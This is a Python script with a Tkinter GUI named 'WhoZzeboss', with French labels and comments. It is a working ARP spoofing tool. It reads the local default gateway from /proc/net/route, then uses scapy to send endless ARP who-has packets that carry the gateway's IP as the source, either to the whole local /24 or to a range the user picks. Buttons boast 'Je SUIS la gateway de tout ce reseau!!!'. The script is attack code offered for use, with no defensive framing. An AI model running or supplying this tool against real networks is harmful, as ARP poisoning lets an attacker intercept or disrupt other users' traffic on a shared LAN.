from scapy.all import *
from Tkinter import *
import socket, struct
 #Read the default gateway directly from /proc.
def get_default_gateway_linux():
	with open("/proc/net/route") as fh:
		for line in fh:
			fields = line.strip().split()
			if fields[1] != '00000000' or not int(fields[3], 16) & 2:
				continue
			return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
net1 = get_default_gateway_linux().split('.')[0]
net2 = get_default_gateway_linux().split('.')[1]
net3 = get_default_gateway_linux().split('.')[2]

network = str(net1) + '.' + str(net2) + '.' + str(net3) + '.'
rangenetall = network + '1-254'


def pwnall():
	a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangenetall)
	print "Je pownerai cet intervalle : " + rangenetall
	sendp(a,inter=RandNum(2,10),loop=1)
	
def pwncust(premadr,dernadr):
	rangecust = network + premadr + "-" + dernadr
	print "Je pownerai cet intervalle : " + rangecust
	a=Ether()/ARP(op="who-has",psrc=get_default_gateway_linux(),pdst=rangecust)
	sendp(a,inter=RandNum(2,10),loop=1)


	#classe pour instancier une "frame" Tkinter
#class Application(Frame): 
#initialisation de cette instance"""
#	def __init__(self,master):
#		Frame.__init__(self,master)
#		self.grid()
#		self.creation_item()
#	def creation_item(self):
#methode de creation d'item
#		self.submit_button = Button(self,text = "Je SUIS la gateway de ce reseau!!!", command = self.action())
#		self.submit_button.grid(row = 0, column = 0, sticky = W)
#		
#		self.text = Text(self, width = 35, height = 5, wrap = WORD)
#		self.text.grid(row = 1, column = 0, sticky = W)
#
#	def action(self):
#agit et affiche un message
#		pwn()
#		self.text.insert(0.0,"C'est VOUS la gateway de ce reseau.")

root = Tk()
root.title("WhoZzeboss")
root.geometry("600x100")

app = Frame(root)
app.grid()
#msgbttn = StringVar()
msgbttn = "Je SUIS la gateway de tout ce reseau!!!"
#msgbttn.set("Je SUIS la gateway de tout ce reseau!!!")
customiz = BooleanVar()
customiz.set(False)
#resultext = StringVar()
#resultext.set("Allez, un peu de courage... Appuyez!")
label_premadr = Label(app, text = "debut ou adresse ip simple")
label_dernadr = Label(app, text = "fin (facultatif)")
case_premadr = Entry(app, bg= "#BBBBBB")
case_dernadr = Entry(app, bg= "#BBBBBB")
#result = Label(app, text = resultext)
result = Label(app, text = "Allez... un peu de courage !")

def action():
#agit et affiche un message
	#resultext.set("Spawnage en cours...")
	result["text"] = "Spawnage en cours..."
	if customiz.get():
		if not case_dernadr.get():
			pwncust(case_premadr.get(),case_premadr.get())
		else:
			pwncust(case_premadr.get(),case_dernadr.get())
	else:
		pwnall()
	
submit_button = Button(app,text = msgbttn, command = action)

def swcustom():
	if customiz.get():
		case_premadr["bg"] = "#FFFFFF"
		case_dernadr["bg"] = "#FFFFFF"
		submit_button["text"] = "VOUS allez manger !!!!"
	else:
		case_premadr["bg"] = "#BBBBBB"
		case_dernadr["bg"] = "#BBBBBB"
		submit_button["text"] = "Je SUIS la gateway de tout ce reseau!!!"
	
rangetext = "Range cible (facultatif) : " + network
checkchoix = Checkbutton(app, text = rangetext, variable = customiz, command = swcustom)
label_premadr.grid(row = 0,column = 1)
case_premadr.grid(row = 1,column = 1, columnspan = 1, sticky = W)
label_dernadr.grid(row = 0,column = 2)
case_dernadr.grid(row = 1,column = 2, columnspan = 1, sticky = W)

result.grid(row = 3, column = 0)

checkchoix.grid(row = 1, column = 0, sticky = W)


submit_button.grid(row = 2, column = 0, sticky = W)


root.mainloop()